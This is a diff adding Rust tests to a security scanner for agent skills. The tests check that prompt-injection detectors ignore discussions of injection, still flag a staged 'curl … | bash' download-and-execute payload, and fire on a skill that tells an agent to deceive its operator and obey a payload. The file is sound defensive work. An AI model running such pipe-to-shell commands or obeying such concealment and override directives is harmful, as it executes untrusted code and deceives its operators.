@@ -285,6 +285,64 @@ fn a_link_local_address_is_not_a_contacted_endpoint() {
 }
 
 #[test]
+fn a_discussion_of_injection_is_not_an_injection() {
+    // GOLD-v13 measured the `PI_*` family at 0/8..2/8 with both annotators in
+    // exact agreement: the detector fired on the *grammar* of security writing,
+    // not its vocabulary. Every shape here is one the round measured as a false
+    // positive: a quoted specimen, a technique table, a chat-template fragment,
+    // a SQL schema column, printed advice and a scanner's own pattern table.
+    let out = scan_fixture("safe", "pi-discussion");
+    let all = rules(&out);
+    let pi: Vec<&String> = all.iter().filter(|r| r.starts_with("PI_")).collect();
+    assert!(
+        pi.is_empty(),
+        "discussing an injection is not issuing one: {:#?}",
+        out.findings
+    );
+    assert!(
+        !all.iter().any(|r| r == "SHELL_EXEC"),
+        "a pattern table is not an invocation: {:#?}",
+        out.findings
+    );
+}
+
+#[test]
+fn a_staged_payload_is_not_a_quoted_specimen() {
+    // The other direction: `var c = 'curl … | bash'` is quoted, and the quoted
+    // suppressions (pattern tables, printed advice) must not swallow it. The
+    // raw_full fix (rev 57) made the quote visible past the display cap, and
+    // `staged_payload` is the exception that keeps the line a finding.
+    let out = scan_fixture("suspicious", "staged-payload");
+    assert_trips(&out, &["DL_PIPE_TO_SHELL"]);
+    let finding = out
+        .findings
+        .iter()
+        .find(|f| f.rule.0 == "DL_PIPE_TO_SHELL")
+        .expect("staged payload must fire");
+    let text = &finding.evidence[0].text;
+    assert!(
+        text.contains("curl -sSL https://get.example.com/install.sh | bash"),
+        "the evidence must show the staged command, got: {text}"
+    );
+}
+
+#[test]
+fn directives_from_the_skill_itself_are_injections() {
+    // The malicious direction of the PI_ work: a skill's own body telling the
+    // agent to deceive the operator and obey a payload is exactly what the
+    // narrowed suppression must keep firing on.
+    let out = scan_fixture("malicious", "pi-directives");
+    let all = rules(&out);
+    for rule in ["PI_CONCEALMENT", "PI_INJECTION_OVERRIDE"] {
+        assert!(
+            all.iter().any(|r| r == rule),
+            "{rule} must fire on a real directive: {:#?}",
+            out.findings
+        );
+    }
+}
+
+#[test]
 fn an_eval_that_is_really_a_subprocess_is_not_dynamic_evaluation() {
     // `exec(cmd, cb)` and `exec('git', [...])` spawn a process (`SHELL_EXEC`'s
     // claim). `exec(compiled, g, locals)` evaluates a string. A `.d.ts`
